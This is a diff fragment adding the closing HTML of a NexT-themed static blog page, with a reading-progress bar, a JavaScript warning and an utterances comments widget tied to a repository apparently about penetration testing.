+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+<script class="next-config" data-name="utterances" type="application/json">{"enable":true,"repo":"byroins/penetration-testing","issue_term":"pathname","theme":"github-light"}</script>
+<script src="/js/third-party/comments/utterances.js" defer></script>
+
+</body>
+</html>
